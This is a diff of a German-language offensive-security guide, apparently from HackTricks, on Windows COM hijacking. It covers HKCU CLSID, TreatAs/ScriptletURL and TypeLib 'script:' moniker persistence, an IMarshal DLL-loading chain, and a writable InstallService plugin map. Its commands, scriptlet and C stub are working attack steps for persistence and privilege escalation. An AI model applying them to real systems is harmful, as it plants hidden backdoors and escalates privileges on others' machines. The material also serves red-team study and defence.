@@ -4,7 +4,7 @@
 
 ### Nach nicht vorhandenen COM-Komponenten suchen
 
-Da die Werte in HKCU von Benutzern geändert werden können, lässt sich **COM Hijacking** als **Persistenzmechanismus** verwenden. Mit `procmon` lassen sich einfach gesuchte COM-Registrierungsschlüssel finden, die noch nicht existieren und von einem Angreifer erstellt werden könnten. Klassische Filter:
+Da die Werte unter HKCU von Benutzern geändert werden können, lässt sich **COM Hijacking** als **Persistenzmechanismus** einsetzen. Mit `procmon` lassen sich einfach gesuchte COM-Registrierungen finden, die noch nicht existieren und von einem Angreifer erstellt werden könnten. Klassische Filter:
 
 - **RegOpenKey**-Operationen.
 - bei denen das _Result_ **NAME NOT FOUND** lautet.
@@ -12,12 +12,12 @@ Da die Werte in HKCU von Benutzern geändert werden können, lässt sich **COM H
 
 Nützliche Varianten bei der Suche:
 
-- Suche auch nach fehlenden **`LocalServer32`**-Schlüsseln. Einige COM-Klassen sind Out-of-Process-Server und starten eine vom Angreifer kontrollierte EXE statt einer DLL.
-- Suche zusätzlich zu `InprocServer32` nach **`TreatAs`**- und **`ScriptletURL`**-Registrierungsvorgängen. In aktuellen Erkennungsregeln und Malware-Analysen wird immer wieder darauf hingewiesen, da diese deutlich seltener als normale COM-Registrierungen und daher besonders aussagekräftig sind.
-- Übernimm beim Klonen einer Registrierung in HKCU das legitime **`ThreadingModel`** aus dem ursprünglichen `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Ein falsches Modell verhindert häufig die Aktivierung und macht den Hijack auffällig.<sup>[[3]](#references)</sup>
-- Untersuche auf 64-Bit-Systemen sowohl die 64-Bit- als auch die 32-Bit-Ansicht (`procmon.exe` vs. `procmon64.exe`, `HKLM\Software\Classes` und `HKLM\Software\Classes\WOW6432Node`), da 32-Bit-Anwendungen möglicherweise eine andere COM-Registrierung auflösen.
+- Suche auch nach fehlenden **`LocalServer32`**-Schlüsseln. Einige COM-Klassen sind Out-of-Process-Server und starten statt einer DLL eine vom Angreifer kontrollierte EXE.
+- Suche zusätzlich zu `InprocServer32` nach Registry-Operationen für **`TreatAs`** und **`ScriptletURL`**. In aktuellen Erkennungsregeln und Malware-Analysen werden diese immer wieder erwähnt, da sie viel seltener als normale COM-Registrierungen und daher besonders aussagekräftig sind.
+- Übernimm beim Klonen einer Registrierung in HKCU den legitimen **`ThreadingModel`** aus dem ursprünglichen `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Ein falsches Modell verhindert oft die Aktivierung und macht den Hijack auffällig.<sup>[[3]](#references)</sup>
+- Überprüfe auf 64-Bit-Systemen sowohl die 64-Bit- als auch die 32-Bit-Ansicht (`procmon.exe` vs. `procmon64.exe`, `HKLM\Software\Classes` und `HKLM\Software\Classes\WOW6432Node`), da 32-Bit-Anwendungen möglicherweise eine andere COM-Registrierung auflösen.
 
-Nachdem du dich entschieden hast, welche nicht vorhandene COM-Komponente du imitieren möchtest, führe die folgenden Befehle aus. _Sei vorsichtig, wenn du eine COM-Komponente imitieren möchtest, die alle paar Sekunden geladen wird, da das übertrieben sein könnte._
+Nachdem du dich für die Nachahmung einer nicht vorhandenen COM-Komponente entschieden hast, führe die folgenden Befehle aus. _Sei vorsichtig, wenn du eine COM-Komponente nachahmen willst, die alle paar Sekunden geladen wird, da das übertrieben sein könnte._
 
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
@@ -25,9 +25,9 @@ New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
 
-### Hijackbare COM-Komponenten der Aufgabenplanung
+### Hijackbare Task Scheduler-COM-Komponenten
 
-Windows-Aufgaben verwenden Custom Triggers, um COM-Objekte aufzurufen. Da sie über die Aufgabenplanung ausgeführt werden, lässt sich leichter vorhersagen, wann sie ausgelöst werden.
+Windows-Aufgaben verwenden Custom Triggers, um COM-Objekte aufzurufen. Da diese über den Task Scheduler ausgeführt werden, lässt sich leichter vorhersagen, wann sie ausgelöst werden.
 
 <pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
 $Tasks = Get-ScheduledTask
@@ -83,17 +83,23 @@ PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
 
-Dann kannst du einfach den HKCU-Eintrag erstellen, und jedes Mal, wenn sich der Benutzer anmeldet, wird deine Backdoor ausgeführt.
+Dann kannst du einfach den HKCU-Eintrag erstellen, und jedes Mal, wenn sich der Benutzer anmeldet, wird deine Backdoor ausgelöst.
 
 ## Verwaiste COM-Registrierungen und Custom Marshaling
 
-Eine systemweite COM-Registrierung kann zu einer DLL-Planting-Möglichkeit werden, ohne dass die Registry geändert werden muss. Suche nach einem `InprocServer32`-Wert, dessen DLL fehlt und dessen endgültiger Pfad von einem Benutzer mit geringen Berechtigungen erstellt oder geändert werden kann. Wird eine DLL mit exakt diesem Namen platziert, lädt jeder Prozess, der die CLSID aktiviert, den Angreifercode. Im CrossDevice-Beispiel lautete der registrierte Pfad `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, sodass ein Standardbenutzer das fehlende Unterverzeichnis und die DLL erstellen konnte.<sup>[[5]](#references)</sup>
+Eine systemweite COM-Registrierung kann zu einer DLL-planting-Möglichkeit werden, ohne dass die Registry geändert werden muss. Suche nach einem `InprocServer32`-Wert, dessen DLL fehlt und dessen endgültiger Pfad von einem Benutzer mit niedrigen Berechtigungen erstellt oder geändert werden kann. Wenn du eine DLL mit exakt diesem Namen platzierst, lädt jeder Prozess, der die CLSID aktiviert, den Code des Angreifers. Im CrossDevice-Beispiel lautete der registrierte Pfad `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, sodass ein Standardbenutzer das fehlende Unterverzeichnis und die DLL erstellen konnte.<sup>[[5]](#references)</sup>
 
-### `IMarshal` als prozessübergreifender DLL-Ladevektor
+### Beschreibbare Plugin-Zuordnungen als privilegierte COM-Aktivierungspfade
 
-COM stellt einen Schnittstellenzeiger normalerweise mit einem standardmäßigen `OBJREF` dar, der den Empfänger an das ursprüngliche Objekt verweist. Ein Objekt, das `IMarshal` implementiert, kann stattdessen ein benutzerdefiniertes `OBJREF` erzeugen. Seine Methode `GetUnmarshalClass` liefert die CLSID des Codes, der das Objekt im empfangenden Prozess rekonstruiert. Diese CLSID muss nicht das ursprüngliche Objekt identifizieren. COM löst sie als In-Process-Server auf und lädt die registrierte DLL, bevor die angeforderte Schnittstellenmethode aufgerufen wird.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
+Eine beschreibbare Zuordnung von Plugin-IDs zu CLSIDs kann es einem Benutzer mit niedrigeren Berechtigungen ermöglichen, auszuwählen, welchen prozessinternen COM-Server ein privilegierter Dienst lädt, selbst wenn die systemweite Registrierung der Klasse nicht bearbeitet werden kann.<sup>[[8]](#references)[[9]](#references)</sup> Im gemeldeten Windows-11-Fall mit `InstallService` konnten Standardbenutzer `StaticPluginMap` ändern; eine nicht integrierte Plugin-ID wählte eine CLSID aus, die der `LocalSystem`-Dienst mit `CLSCTX_INPROC_SERVER` und `IID_IInstallServicePlugin` an `CoCreateInstance` übergab.<sup>[[8]](#references)[[9]](#references)</sup> Die registrierte DLL wird in den Dienstprozess geladen und nicht in einen separaten COM-Host.<sup>[[10]](#references)</sup>
 
-Eine minimale bösartige Implementierung muss lediglich die verwaiste CLSID in `GetUnmarshalClass` einsetzen.<sup>[[5]](#references)</sup>
+Zu den relevanten Bedingungen gehören effektiver Schreibzugriff auf die Zuordnung, eine erreichbare Plugin-Anforderung und ein `InprocServer32`-DLL-Pfad, den der Benutzer mit niedrigeren Berechtigungen kontrollieren kann.<sup>[[8]](#references)[[9]](#references)</sup> Die oben genannte CrossDevice-Registrierung erfüllte im gemeldeten Fall die Pfadbedingung.<sup>[[8]](#references)[[9]](#references)</sup> Ein erfolgreiches Plugin-Objekt muss die angeforderte Schnittstelle bereitstellen, aber die DLL wird geladen, bevor `CoCreateInstance` abgeschlossen ist; wenn die Schnittstelle nicht bereitgestellt wird, schließt das allein eine Codeausführung während des Ladens nicht aus.<sup>[[8]](#references)[[11]](#references)</sup> Dieser Dienst-Dispatch-Pfad unterscheidet sich vom weiter unten beschriebenen Pfad über benutzerdefiniertes `IMarshal`. Für die separate Dateipfad-Möglichkeit siehe [DLL Hijacking](dll-hijacking/).
+
+### `IMarshal` als prozessübergreifende DLL-Lademöglichkeit
+
+COM stellt einen Schnittstellenzeiger normalerweise mit einem standardmäßigen `OBJREF` dar, das den Empfänger auf das ursprüngliche Objekt verweist. Ein Objekt, das `IMarshal` implementiert, kann stattdessen ein benutzerdefiniertes `OBJREF` erzeugen. Seine Methode `GetUnmarshalClass` liefert die CLSID des Codes, der das Objekt im empfangenden Prozess rekonstruiert. Diese CLSID muss nicht das ursprüngliche Objekt bezeichnen. COM löst sie als prozessinternen Server auf und lädt die registrierte DLL, bevor die angeforderte Schnittstellenmethode aufgerufen wird.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
+
+Eine minimale bösartige Implementierung muss in `GetUnmarshalClass` lediglich die verwaiste CLSID einsetzen.<sup>[[5]](#references)</sup>
 
 ```c
 HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
@@ -104,20 +110,20 @@ HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
 }
 ```
 
-Dieses Objekt über einen proxied Methodenparameter wie `[in] IUnknown *` senden. Eine weitere Möglichkeit ist `CoGetInstanceFromIStorage`; dabei muss das custom-marshaled Objekt außerdem `IStorage` ausreichend implementieren, um die lokalen Prüfungen zu bestehen. Das automatische Unmarshaling auf dem Remote-Server löst die ersetzte CLSID auf, sodass die DLL geladen wird, bevor die Zielmethode ausgeführt wird.<sup>[[5]](#references)</sup>
+Übergeben Sie dieses Objekt über einen proxied Methodenparameter, etwa einen `[in] IUnknown *`. Eine weitere Möglichkeit ist `CoGetInstanceFromIStorage`, wobei das custom-marshaled Objekt zusätzlich genug von `IStorage` implementiert, um die lokalen Prüfungen zu bestehen. Das automatische Unmarshaling im Remote-Server löst die ersetzte CLSID auf, sodass die DLL geladen wird, bevor die Zielmethode ausgeführt wird.<sup>[[5]](#references)</sup>
 
-Dieses Primitive ist nicht auf fehlende Registrierungen beschränkt. Es kann den Empfänger auch dazu zwingen, eine vorhandene Custom-Unmarshaler-DLL zu laden und Fehler in deren Lade- oder Unmarshaling-Pfad offenzulegen.<sup>[[5]](#references)</sup>
+Das Primitive ist nicht auf fehlende Registrierungen beschränkt. Es kann den Empfänger auch dazu zwingen, eine vorhandene Custom-Unmarshaler-DLL zu laden und Fehler in deren Lade- oder Unmarshaling-Pfad aufzudecken.<sup>[[5]](#references)</sup>
 
 Die Kette setzt alle folgenden Bedingungen voraus:<sup>[[5]](#references)</sup>
 
 1. Eine maschinenweit sichtbare CLSID verweist auf eine fehlende oder ersetzbare In-Process-DLL.
-2. Der Angreifer kann diese DLL am aufgelösten Pfad ablegen.
+2. Der Angreifer kann diese DLL im aufgelösten Pfad ablegen.
 3. Ein aktivierbarer Out-of-Process-COM-Server läuft mit der gewünschten Berechtigungsstufe.
 4. Der Server akzeptiert Custom Marshaling und stellt einen proxied Aufruf bereit, der das Angreiferobjekt über die Prozessgrenze hinweg überträgt.
 
-### Nicht mehr vorhandene In-Process-Server finden
+### Verwaiste In-Process-Server finden
 
-[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) und [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) können die maschinenweite COM-Datenbank enumerieren und jeden Server mithilfe der normalen Win32-Modulauflösung testen. Das ist `Test-Path` vorzuziehen, da manche Registrierungen nur einen Dateinamen enthalten und sich auf den Suchpfad des Loaders stützen.<sup>[[5]](#references)</sup>
+[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) und [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) können die maschinenweite COM-Datenbank aufzählen und jeden Server mithilfe der normalen Win32-Modulauflösung testen. Das ist `Test-Path` vorzuziehen, da manche Registrierungen nur einen Dateinamen enthalten und sich auf den Loader-Suchpfad verlassen.<sup>[[5]](#references)</sup>
 
 ```powershell
 function Test-ComServer($Server) {
@@ -132,13 +138,13 @@ $classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
     Sort-Object DefaultServer | Select-Object Name, DefaultServer
 ```
 
-Behandle das Ergebnis als Kandidatenliste, nicht als Beweis für die Ausnutzbarkeit. Löse den Pfad so auf, wie es der Loader tut, und prüfe die DACL des ersten vorhandenen übergeordneten Verzeichnisses sowie die der vorgesehenen DLL, falls diese bereits existiert. Eine fehlende Datei ist nur dann relevant, wenn der Angreifer den Pfad erstellen oder ersetzen kann, den COM tatsächlich auflösen wird.<sup>[[5]](#references)</sup>
+Behandle das Ergebnis als Kandidatenliste, nicht als Beweis für Ausnutzbarkeit. Löse den Pfad so auf, wie es der Loader tut, und prüfe dann die DACL des ersten vorhandenen übergeordneten Verzeichnisses sowie der vorgesehenen DLL, falls sie bereits existiert. Eine fehlende Datei ist nur dann relevant, wenn der Angreifer den Pfad erstellen oder ersetzen kann, den COM tatsächlich auflösen wird.<sup>[[5]](#references)</sup>
 
 ### Einen privilegierten Empfänger auswählen und starten
 
-Untersuche mögliche COM-Klassen auf `RunAs`, Dienstzugehörigkeit, verfügbare Schnittstellen und RPC-Proxys. Eine für `SYSTEM` konfigurierte Klasse, die keinem benannten Dienst zugeordnet ist, lässt sich möglicherweise nicht direkt aktivieren, weil RPCSS sie nicht starten kann. Suche in diesem Fall nach einem nicht privilegierten Auslöser, der ihren Host startet, etwa einer ausführbaren geplanten Aufgabe, und stelle alle benannten Ereignisse oder IPC-Voraussetzungen wieder her, die den Server am Laufen halten.<sup>[[5]](#references)</sup>
+Untersuche mögliche COM-Klassen auf `RunAs`, Dienstzuordnung, verfügbare Schnittstellen und RPC-Proxys. Eine für `SYSTEM` konfigurierte Klasse, hinter der kein benannter Dienst steht, kann bei direkter Aktivierung fehlschlagen, da RPCSS sie nicht starten kann. Suche in diesem Fall nach einem nicht privilegierten Auslöser, der ihren Host startet, etwa einer ausführbaren geplanten Aufgabe, und erfülle alle erforderlichen Named-Event- oder IPC-Voraussetzungen, durch die der Server aktiv bleibt.<sup>[[5]](#references)</sup>
 
-Beispielsweise startete die anfällige Shell-Create-Object-Handler-Kette ihren Host, indem sie vor dem Aufruf einer vom Benutzer ausführbaren geplanten Aufgabe das erwartete globale Ereignis erstellte.<sup>[[5]](#references)</sup>
+Beispielsweise startete die anfällige Shell-Create-Object-Handler-Kette ihren Host, indem sie das erwartete globale Event erstellte, bevor sie eine vom Benutzer ausführbare geplante Aufgabe aufrief.<sup>[[5]](#references)</sup>
 
 ```powershell
 $ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
@@ -147,7 +153,7 @@ $ev.Wait()
 $object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
 ```
 
-Ordne die resultierende Objektreferenz ihrem Host zu und überprüfe sowohl die Identität als auch die Marshaling-Richtlinie. Enumeriere anschließend die Schnittstellen und wandle ihre Proxys in IDL um, um einen Eingabeparameter wie `IUnknown *` zu finden, der das gefälschte Objekt marshalt.<sup>[[5]](#references)</sup>
+Ordne die resultierende Objektreferenz ihrem Host zu und überprüfe sowohl die Identität als auch die Marshaling-Richtlinie. Zähle dann die Schnittstellen auf und wandle ihre Proxys in IDL um, um einen Eingabeparameter wie `IUnknown *` zu finden, der das gefälschte Objekt marshallen kann.<sup>[[5]](#references)</sup>
 
 ```powershell
 $objref = Get-ComObjRef -Object $object
@@ -158,23 +164,23 @@ Get-ComInterface -Object $object
 Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
 ```
 
-### Schutzmaßnahmen für Custom-Marshaling
+### Schutzmaßnahmen für Custom Marshaling
 
-Ein geeigneter Empfänger darf nicht vertrauenswürdige Custom-Marshaler nicht ablehnen. Zwei prozessweite Schutzmaßnahmen sind `EOAC_NO_CUSTOM_MARSHAL` in den an `CoInitializeSecurity` übergebenen Capabilities und `COMGLB_UNMARSHALING_POLICY_STRONG`, gesetzt über `IGlobalOptions::Set`. Mit Symbols lässt sich der entsprechende Status in `combase!gCapabilities` und `combase!g_GLBOPT_UnmarshalingPolicy` überprüfen; NtObjectManager gibt das Ergebnis als `CustomMarshalAllowed` aus, sofern sein Prozess-Parser den Windows-Build unterstützt.<sup>[[5]](#references)</sup>
+Ein geeigneter Empfänger darf nicht vertrauenswürdige Custom Marshaler nicht ablehnen. Zwei prozessweite Schutzmaßnahmen sind `EOAC_NO_CUSTOM_MARSHAL` in den an `CoInitializeSecurity` übergebenen Capabilities und `COMGLB_UNMARSHALING_POLICY_STRONG`, gesetzt über `IGlobalOptions::Set`. Mit Symbolen lässt sich der entsprechende Zustand in `combase!gCapabilities` und `combase!g_GLBOPT_UnmarshalingPolicy` prüfen; NtObjectManager stellt das Ergebnis als `CustomMarshalAllowed` bereit, sofern sein Prozessparser den Windows-Build unterstützt.<sup>[[5]](#references)</sup>
 
 ---
 
 ## COM TreatAs Hijacking + ScriptletURL
 
-`TreatAs` ermöglicht es, eine CLSID durch eine andere zu emulieren.<sup>[[4]](#references)</sup> Aus offensiver Sicht bedeutet dies, dass du die ursprüngliche CLSID unverändert lassen, eine zweite CLSID pro Benutzer erstellen kannst, die auf `scrobj.dll` verweist, und anschließend das reale COM-Objekt mit `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` auf das bösartige Objekt umleiten kannst.
+`TreatAs` ermöglicht, dass eine CLSID durch eine andere emuliert wird.<sup>[[4]](#references)</sup> Aus offensiver Sicht bedeutet das, dass du die ursprüngliche CLSID unverändert lassen, eine zweite CLSID pro Benutzer erstellen kannst, die auf `scrobj.dll` verweist, und dann das echte COM-Objekt mit `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` auf das bösartige Objekt umleiten kannst.
 
 Das ist nützlich, wenn:
 
-- die Zielanwendung bereits beim Anmelden oder beim Start der Anwendung eine stabile CLSID instanziiert
-- du eine reine Registry-Umleitung möchtest, statt den ursprünglichen `InprocServer32` zu ersetzen
-- du über den Wert `ScriptletURL` ein lokales oder entferntes `.sct`-Scriptlet ausführen möchtest
+- die Zielanwendung beim Anmelden oder Starten der Anwendung bereits eine stabile CLSID instanziiert
+- du eine Umleitung ausschließlich über die Registry möchtest, statt das ursprüngliche `InprocServer32` zu ersetzen
+- du über den Wert `ScriptletURL` ein lokales oder remote gespeichertes `.sct`-Scriptlet ausführen möchtest
 
-Beispielablauf (angepasst an die Vorgehensweisen aus dem öffentlichen Atomic Red Team und älteren Untersuchungen zum Missbrauch der COM-Registry):
+Beispiel-Workflow (angepasst aus der öffentlichen Atomic Red Team Tradecraft und älterer Forschung zum Missbrauch der COM-Registry):
 
 ```cmd
 :: 1. Create a malicious per-user COM class backed by scrobj.dll
@@ -191,19 +197,19 @@ reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\Trea
 
 Notes:
 
-- `scrobj.dll` liest den Wert `ScriptletURL` und führt die referenzierte `.sct` aus. Daher kann die Payload als lokale Datei gespeichert oder per HTTP/HTTPS remote abgerufen werden.
-- `TreatAs` ist besonders nützlich, wenn die ursprüngliche COM-Registrierung in HKLM vollständig und stabil ist, da dann nur eine kleine benutzerspezifische Umleitung erforderlich ist, statt den gesamten Baum zu spiegeln.
-- Zur Validierung ohne Warten auf den natürlichen Trigger kannst du den gefälschten ProgID/CLSID manuell mit `rundll32.exe -sta <ProgID-or-CLSID>` instanziieren, sofern die Zielklasse STA-Aktivierung unterstützt.
+- `scrobj.dll` liest den Wert `ScriptletURL` und führt die referenzierte `.sct` aus. Daher können Sie die Payload als lokale Datei bereitstellen oder sie per HTTP/HTTPS remote abrufen.
+- `TreatAs` ist besonders nützlich, wenn die ursprüngliche COM-Registrierung in HKLM vollständig und stabil ist, da Sie dann nur eine kleine benutzerspezifische Umleitung statt des gesamten Baums spiegeln müssen.
+- Um die Funktion zu überprüfen, ohne auf den natürlichen Trigger zu warten, können Sie die gefälschte ProgID/CLSID manuell mit `rundll32.exe -sta <ProgID-or-CLSID>` instanziieren, sofern die Zielklasse STA-Aktivierung unterstützt.
 
 ## COM TypeLib Hijacking (script: moniker persistence)
 
-Typbibliotheken (TypeLib) definieren COM-Schnittstellen und werden über `LoadTypeLib()` geladen. Wenn ein COM-Server instanziiert wird, lädt das Betriebssystem möglicherweise auch die zugehörige TypeLib, indem es die Registrierungsschlüssel unter `HKCR\TypeLib\{LIBID}` abfragt. Wird der Pfad der TypeLib durch einen **moniker** ersetzt, z. B. `script:C:\...\evil.sct`, führt Windows das Scriptlet aus, wenn die TypeLib aufgelöst wird – so entsteht eine unauffällige Persistenz, die ausgelöst wird, wenn gängige Komponenten verwendet werden.
+Type Libraries (TypeLib) definieren COM-Schnittstellen und werden über `LoadTypeLib()` geladen. Wenn ein COM-Server instanziiert wird, lädt das Betriebssystem möglicherweise auch die zugehörige TypeLib, indem es Registrierungsschlüssel unter `HKCR\TypeLib\{LIBID}` abfragt. Wird der Pfad der TypeLib durch einen **moniker** ersetzt, z. B. `script:C:\...\evil.sct`, führt Windows das Scriptlet aus, wenn die TypeLib aufgelöst wird – so entsteht eine unauffällige Persistenz, die ausgelöst wird, wenn gängige Komponenten verwendet werden.
 
-Dies wurde beim Microsoft-Webbrowser-Steuerelement beobachtet (das häufig von Internet Explorer, Apps mit eingebettetem WebBrowser und sogar `explorer.exe` geladen wird).<sup>[[1]](#references)[[2]](#references)</sup>
+Dies wurde beim Microsoft Web Browser Control beobachtet (das häufig von Internet Explorer, Apps mit eingebettetem WebBrowser und sogar `explorer.exe` geladen wird).<sup>[[1]](#references)[[2]](#references)</sup>
 
 ### Schritte (PowerShell)
 
-1) Ermittle die TypeLib (LIBID), die von einer häufig verwendeten CLSID genutzt wird. Beispiel für eine CLSID, die oft in Malware-Ketten missbraucht wird: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft-Webbrowser).
+1) Identifizieren Sie die von einer häufig verwendeten CLSID genutzte TypeLib (LIBID). Beispiel für eine CLSID, die häufig von Malware-Ketten missbraucht wird: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
 
 ```powershell
 $clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
@@ -212,7 +218,7 @@ $ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First
 "CLSID=$clsid  LIBID=$libid  VER=$ver"
 ```
 
-2) Verweise den benutzerspezifischen TypeLib-Pfad mithilfe des `script:`-Monikers auf ein lokales Scriptlet (keine Administratorrechte erforderlich):
+2) Verweisen Sie den benutzerspezifischen TypeLib-Pfad mithilfe des `script:`-Monikers auf ein lokales Scriptlet (keine Administratorrechte erforderlich):
 
 ```powershell
 $dest = 'C:\\ProgramData\\Udate_Srv.sct'
@@ -220,7 +226,7 @@ New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force 
 Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
 ```
 
-3) Lege eine minimale JScript-`.sct` ab, die deine primäre Payload (z. B. eine `.lnk`, die von der initialen Kette verwendet wird) erneut startet:
+3) Platziere ein minimales JScript-`.sct`, das dein primäres Payload erneut startet (z. B. eine `.lnk`, die in der initialen Kette verwendet wird):
 
 ```xml
 <?xml version="1.0"?>
@@ -239,7 +245,7 @@ Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32"
 </scriptlet>
 ```
 
-4) Auslösen – Das Öffnen von IE, einer Anwendung, die das WebBrowser-Steuerelement einbettet, oder sogar gewöhnliche Explorer-Aktivitäten laden die TypeLib und führen das Scriptlet aus, wodurch deine Kette bei der Anmeldung/beim Neustart erneut aktiviert wird.
+4) Auslösen – das Öffnen von IE, einer Anwendung, die das WebBrowser-Steuerelement einbettet, oder sogar routinemäßige Explorer-Aktivität lädt die TypeLib und führt das Scriptlet aus, wodurch deine Chain bei der Anmeldung/beim Neustart erneut aktiviert wird.
 
 Bereinigung
 ```powershell
@@ -249,18 +255,22 @@ Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$n
 Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
 ```
 
-Hinweise
-- Dieselbe Logik lässt sich auf andere häufig verwendete COM-Komponenten anwenden; löse immer zuerst die echte `LIBID` aus `HKCR\CLSID\{CLSID}\TypeLib` auf.
+Notes
+- Dieselbe Logik lässt sich auf andere häufig verwendete COM-Komponenten anwenden. Ermittle zuerst immer die tatsächliche `LIBID` unter `HKCR\CLSID\{CLSID}\TypeLib`.
 - Auf 64-Bit-Systemen kannst du auch den Unterschlüssel `win64` für 64-Bit-Consumer anlegen.
 
 ## References
 
-- [1] [Die TypeLib hijacken – Eine neue COM-Persistenztechnik (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
-- [2] [Check Point Research – ZipLine-Kampagne: Eine ausgeklügelte Phishing-Attacke gegen US-amerikanische Unternehmen](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [1] [Die TypeLib hijacken – Neue COM-Persistenztechnik (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [2] [Check Point Research – ZipLine-Kampagne: Ein ausgeklügelter Phishing-Angriff auf US-Unternehmen](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
 - [3] [COM-Hijacking neu betrachtet (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
 - [4] [CLSID-Schlüssel (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
 - [5] [Project Zero – Windows-Exploitation-Techniken: Verwaiste COM-Objektregistrierungen](https://projectzero.google/2026/09/windows-dangling-com.html)
 - [6] [Microsoft Learn – IMarshal-Schnittstelle](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
 - [7] [Microsoft Open Specifications – MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
+- [8] [Dark Elevator PoC und technischer Bericht (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
+- [9] [Dark Elevator: Lokale Rechteausweitung über den Windows-Installationsdienst (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
+- [10] [CLSCTX-Aufzählung (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
+- [11] [CoCreateInstance-Funktion (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
 {{#include ../../banners/hacktricks-training.md}}
 
